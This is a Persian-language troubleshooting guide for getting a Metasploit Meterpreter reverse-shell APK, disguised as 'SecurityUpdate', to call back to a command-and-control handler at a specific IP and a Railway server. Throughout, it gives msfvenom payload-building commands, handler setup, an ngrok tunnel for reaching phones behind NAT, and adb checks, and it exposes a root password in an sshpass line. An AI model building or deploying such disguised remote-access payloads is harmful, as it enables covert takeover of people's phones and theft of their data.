# 🔧 عیب‌یابی Session - چرا اتصال برقرار نمیشه؟

## ✅ وضعیت فعلی

```
Handler: ✅ RUNNING (Port 4444)
APK: ✅ INSTALLED (با همه دسترسی‌ها)
Internet: ✅ CONNECTED
Session: ❌ NOT ESTABLISHED
```

---

## 🚨 مشکل احتمالی #1: اپ اجرا نشده

### علت:
- فقط "نصب کردن" APK کافی نیست
- اپ باید حداقل یکبار "اجرا" بشه
- Meterpreter payload در background کار میکنه (بدون UI)

### راه حل:
```bash
# در موبایل شبیه‌ساز:
1. Settings → Apps → MainActivity
2. Force Stop بزن
3. بعد روی Open بزن
4. صبر کن 10 ثانیه
```

---

## 🚨 مشکل احتمالی #2: مشکل شبکه (Firewall/NAT)

### تست اتصال:
```bash
# در موبایل (اگر terminal داری):
ping 208.77.244.15
telnet 208.77.244.15 4444
```

### راه حل:
اگر ping/telnet کار نمیکنه:
- شبکه موبایل پشت Firewall هست
- پورت 4444 مسدوده
- باید از Reverse Port Forwarding استفاده کنی

---

## 🚨 مشکل احتمالی #3: APK با IP اشتباه ساخته شده

### بررسی:
```bash
# چک کن APK با چه IP ساخته شده:
unzip -p SecurityUpdate_Signed.apk classes.dex | strings | grep "208.77.244"
```

### راه حل:
اگر IP اشتباه بود، APK جدید بساز:
```bash
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=IP_DOROST \
  LPORT=4444 \
  -o SecurityUpdate_New.apk
```

---

## 🎯 روش‌های جایگزین (اگر مستقیم کار نکرد)

### روش 1: استفاده از Bind Payload (به جای Reverse)

```bash
# در موبایل شبیه‌ساز، یه port باز کن:
msfvenom -p android/meterpreter/bind_tcp \
  LPORT=4444 \
  -o SecurityUpdate_Bind.apk

# بعد از نصب، از Parrot به موبایل وصل شو:
msfconsole
use exploit/multi/handler
set PAYLOAD android/meterpreter/bind_tcp
set RHOST IP_MOBILE
set RPORT 4444
exploit
```

### روش 2: استفاده از ngrok (Tunnel)

```bash
# در سرور Railway:
ngrok tcp 4444

# IP و Port جدیدی میده، مثلاً: 0.tcp.ngrok.io:12345
# APK رو با این آدرس بساز:
msfvenom -p android/meterpreter/reverse_tcp \
  LHOST=0.tcp.ngrok.io \
  LPORT=12345 \
  -o SecurityUpdate_Ngrok.apk
```

### روش 3: استفاده از مسیر محلی (اگر در همان شبکه‌اند)

```bash
# پیدا کردن IP محلی Railway:
ssh -p 55001 root@crossover.proxy.rlwy.net "hostname -I"

# APK با IP محلی بساز
```

---

## 🔍 Debug با ADB (اگر USB دسترسی داری)

### نصب و اجرا:
```bash
# نصب APK
adb install -r SecurityUpdate_Signed.apk

# اجرای مستقیم
adb shell am start -n com.metasploit.stage/.MainActivity

# بررسی لاگ
adb logcat | grep -i "metasploit\|meterpreter\|stage"

# بررسی اتصالات شبکه
adb shell netstat | grep 4444

# بررسی پروسس
adb shell ps | grep metasploit
```

### تست اتصال شبکه از موبایل:
```bash
# باز کردن shell در موبایل
adb shell

# تست ping
ping -c 4 208.77.244.15

# تست port با nc (اگر موجود باشه)
nc -vz 208.77.244.15 4444
```

---

## 📊 چک‌لیست نهایی

قبل از تست مجدد، این موارد رو چک کن:

- [ ] Handler روی سرور Railway فعال هست؟
  ```bash
  ssh -p 55001 root@crossover.proxy.rlwy.net "ps aux | grep msfconsole"
  ```

- [ ] Port 4444 باز هست؟
  ```bash
  ssh -p 55001 root@crossover.proxy.rlwy.net "ss -tlnp | grep 4444"
  ```

- [ ] APK با IP صحیح (208.77.244.15) ساخته شده؟

- [ ] اپ در موبایل نصب شده و حداقل یکبار اجرا شده؟

- [ ] موبایل به اینترنت متصل هست؟

- [ ] Firewall موبایل یا شبکه مسدود نیست؟

- [ ] دسترسی‌های اپ (Permissions) داده شده؟

---

## 🚀 تست سریع (Step by Step)

### در Parrot OS:
```bash
# Terminal 1: نظارت بر sessions
cd ~/Documents/GitHub/metasploit-framework1
watch -n 5 "sshpass -p 8181 ssh -o StrictHostKeyChecking=no -p 55001 root@crossover.proxy.rlwy.net 'msfconsole -q -x \"sessions -l; exit\"'"
```

### در موبایل:
1. Settings → Apps → MainActivity → Force Stop
2. Storage → Clear Cache
3. باز کردن اپ از App Drawer
4. صبر 15 ثانیه

### نتیجه:
- اگر session برقرار شد: ✅ موفق!
- اگر نشد: به بخش "مشکلات احتمالی" برگرد

---

## 📝 نکات مهم

### چرا APK باز نمیشه؟
- این طبیعیه! Meterpreter payload UI نداره
- فقط یه صفحه خالی نشون میده یا مستقیم بسته میشه
- مهم اینه که کد در background اجرا بشه

### چرا باید اپ رو "باز" کنیم؟
- Android اجازه نمیده اپ‌ها خودکار background service راه بندازن
- باید حداقل یکبار توسط کاربر اجرا بشه
- بعد از اولین اجرا، در background فعال میمونه

### چگونه مطمئن بشیم اپ کار میکنه؟
```bash
# با ADB:
adb shell dumpsys package com.metasploit.stage | grep -A5 "Running"
```

---

**آخرین بروزرسانی:** 22 نوامبر 2025  
**Handler Status:** RUNNING  
**Next Step:** اجرای مستقیم اپ در موبایل و نظارت بر sessions
